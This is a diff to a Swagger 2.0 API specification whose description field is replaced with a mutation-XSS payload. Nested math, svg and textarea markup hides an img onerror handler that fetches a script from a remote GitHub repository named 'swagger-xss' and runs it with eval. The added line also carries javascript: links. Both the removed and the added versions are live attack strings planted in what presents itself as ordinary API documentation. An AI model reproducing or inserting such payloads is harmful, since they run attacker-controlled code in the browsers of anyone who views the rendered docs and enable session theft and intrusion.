@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg onload=alert('1337')><mtext><textarea><a title='</textarea><img src onerror=fetch("https://raw.githubusercontent.com/randixploit/swagger-xss/refs/heads/main/script.js").then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1></textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch("https://raw.githubusercontent.com/randixploit/swagger-xss/refs/heads/main/script.js").then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1><a href="javascropt:alert(1)">xss</a></textarea></desc></textarea><a href="javascropt:alert(1)">xss</a</mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
 basePath: /JSSResource/
 produces:
